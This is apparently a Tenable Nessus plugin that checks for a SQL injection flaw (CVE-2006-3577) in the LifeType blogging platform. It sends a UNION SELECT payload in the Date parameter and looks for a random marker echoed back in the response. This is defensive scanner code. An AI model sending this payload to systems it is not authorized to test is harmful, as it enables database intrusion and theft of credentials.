#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22005);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2006-3577");
  script_bugtraq_id(18835);
  script_osvdb_id(28180);

  script_name(english:"LifeType index.php Date Parameter SQL Injection");
  script_summary(english:"Tries to exploit SQL injection issue in LifeType");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LifeType, an open source blogging platform
written in PHP. 

The version of LifeType installed on the remote host fails to sanitize
user-supplied input to the 'Date' parameter of the 'index.php' script
before using it to construct database queries.  Regardless of PHP's
'magic_quotes_gpc' setting, an unauthenticated attacker can exploit
this flaw to manipulate database queries and, for example, recover the
administrator's password hash." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/07/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/07/05");
 script_cvs_date("$Date: 2013/01/11 22:59:17 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:lifetype:lifetype");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/lifetype", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw.
  magic = rand();
  exploit = string("' UNION SELECT 1,", magic, ",1,1,1,1,1,1,1,1--");
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "op=Default&",
      "Date=200607", urlencode(str:exploit), "&",
      "blogId=1"
    ),
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # it looks like LifeType and...
    '<meta name="generator" content="lifetype' >< res &&
    # it uses our string for an article id
    string('articleId=', magic, '&amp;blogId=1">') >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
